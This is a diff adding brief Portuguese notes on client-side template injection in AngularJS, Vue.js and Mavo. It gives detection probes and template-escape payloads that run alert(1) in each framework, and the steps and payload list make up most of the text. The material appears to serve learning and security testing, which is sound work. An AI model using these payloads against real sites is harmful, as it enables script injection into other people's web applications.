@@ -1,0 +1,51 @@
+O CSTI(CLIENT SIDE TEMPLATE INJECTION) É UMA VULNERABILIDADE QUE ACONTECE QUANDO 
+OS APLICATIVOS QUE USAM UMA ESTRUTURA DE MODELO DO LADO DO CLIENTE INCORPORAM
+DINÂMICAMENTE A ENTRADA DO USUÁRIO NAS PÁGINAS WEB.
+
+	ESSAS INJEÇÕES OCORREM EM ALGUMAS TECNOLOGIAS JAVASCRIPT WEB COMUMENTE USADAS:
+		
+		1.ANGULARJS
+		
+		2.VUEJS V2 E V3
+		
+		3.MAVO
+		
+	COMO REALIZAR O ATAQUE:
+		
+		1.PROCURE TEMPLATES COMO POR EXEMPLO: ONDE INSERIR CONTATO, EMAIL, NOME DE USUÁRIO, ETC...
+		 EM SITES QUE USAM ESSAS TECNOLOGIAS, OU EM URLS, MAS QUE SEJAM REFLETIDAS NA TELA A RESPOSTA
+		 DO FORMULARIO.
+		 	
+		 	EXEMPLO DE URL: https://seusite.com/?idade=18
+		 
+		2.TESTE SE TEM A VULNERABILIDADE USANDO: {{5*5}}, <%= 5*5%>
+		SE FOR RESPONDIDO COM O NÚMERO 25. SIGNIFICA HAVER ESSA VULNERABILIDADE.
+		
+		3.INJETE CÓDIGOS DE XSS.
+		
+		
+		CARGAS UTÉIS PARA INJETAR XSS:
+		
+			ANGULARJS:
+				
+				{{$on.constructor('alert(1)')()}}
+				
+				{{constructor.constructor('alert(1)')()}}
+				
+			VUEJS:
+				
+				V2:
+				
+				{{constructor.constructor('alert(1)')()}}
+				
+				V3:
+				
+				{{_openBlock.constructor('alert(1)')()}}
+				
+			MAVO:
+				
+				[self.alert(1)mod1]
+				
+				[self.alert(1)]
+				
+				[(1,alert)(1)]
